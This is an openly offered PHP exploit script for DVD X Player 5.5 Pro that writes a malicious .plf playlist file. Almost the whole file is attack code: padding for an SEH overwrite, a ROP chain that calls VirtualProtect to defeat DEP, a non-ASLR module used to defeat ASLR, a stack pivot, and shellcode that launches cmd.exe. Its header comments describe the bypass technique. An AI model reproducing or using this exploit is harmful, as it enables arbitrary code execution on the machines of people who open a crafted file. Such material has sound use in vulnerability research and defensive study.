<?php

/*
Title: DVD X Player 5.5 Pro (DEP + ASLR Bypass) Exploit
Date: Sep 08, 2011
Author: Rew (rew@leethax.info)
Discovered by: Blake (http://www.exploit-db.com/exploits/17788/)
Link: http://www.dvd-x-player.com/download/DVDXPlayerSetup.exe
Tested on: WinXP Pro SP3 + OptOut DEP
CVE: NA (0day)

DEP bypass via VirtualProtect
ASLR bypass via non-aslr module (EPG.dll)
No SafeSEH so we use the SEH @ 616 bytes

This is my very first DEP + ASLR bypassing exploit.  awesomeface.jpg
If it looks clunky and rediculous, rather than hating, drop me a line
and offer some advice for improvement.  irc.rizon.net#beer

Many thanks to Corelan Team for their wonderful article here...
http://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/
*/

$padding_1 = str_repeat("A", 336);

// ROP till ya drop!
$rop = "\x08\xd9\x62\x61";	// push esp; sub eax, 20; pop ebx; retn
$rop .= "JUNK";
$rop .= "\x24\x01\x64\x61";	// xchg eax, ebx; retn
$rop .= "\xe2\xe4\x60\x61";	// xchg eax, ecx; add al, [eax]; add esp, 4; mov eax, esi; pop esi; retn 4
$rop .=	"JUNK";
$rop .= "JUNK";
$rop .= "\x02\x67\x62\x61";	// pop eax; retn
$rop .= "JUNK";
$rop .= "\x08\x11\x01\x10";	// ptr to VirtualProtect
$rop .= "\x37\x13\x63\x61";	// pop edi; pop esi; retn
$rop .= "\x1b\x76\x61\x61";	// retn
$rop .= "\x50\x8b\x62\x61";	// jmp [eax]
$rop .= "\x3f\x85\x60\x61";	// pop ebp; retn
$rop .= "\x66\x56\x60\x61";	// add esp, 8; retn // return of VirtualProtect
$rop .= "\x50\x17\x60\x61";	// pop ebx; retn
$rop .= "\x84\xcd\x6f\x83";	// this will be added to the pointer already in edx to wrap and get 0x00000040
$rop .= "\x9e\x76\x62\x61";	// add edx, ebx; pop ebx; retn 10
$rop .= "\x01\x01\x01\x01";	// dword size // pretty big, but whatever, easier than dealing with nulls
$rop .= "\x31\x08\x62\x61";	// pushad; retn
$rop .= "JUNK";
$rop .= "JUNK";
$rop .= "JUNK";
$rop .= "JUNK";
$rop .= "JUNK";
// Couldn't find a good null-free jmp esp, so we do some more ROP to
// get esp in eax and then jmp eax to our shellcode on the stack.
$rop .= "\x08\xd9\x62\x61";	// push esp; sub eax, 20; pop ebx; retn
$rop .= "\x24\x01\x64\x61";	// xchg eax, ebx; retn
$rop .= "\xf0\x8d\x62\x61";	// add eax, 0c; retn // one more little nudge
$rop .= "\x5b\x5e\x62\x61";	// jmp eax;

$padding_2 = str_repeat("\x90", (274 - strlen($rop)));

$jmp = "\xeb\x04";	// over the pivot and into the shellcode

$pivot = "\xae\x74\x60\x61";	// add esp, 408; retn 4

// Win32 XP SP3 WinExec cmd.exe
$shellcode = 
"\x8b\xec\x55\x8b\xec\x68\x65\x78\x65\x2F" .
"\x68\x63\x6d\x64\x2e\x8d\x45\xf8\x50\xb8" .
"\xc7\x93\xc2\x77\xff\xd0";

$exploit = $padding_1.$rop.$padding_2.$jmp.$pivot.$shellcode;

fwrite(fopen("eggsploit.plf", "w"), $exploit);

?>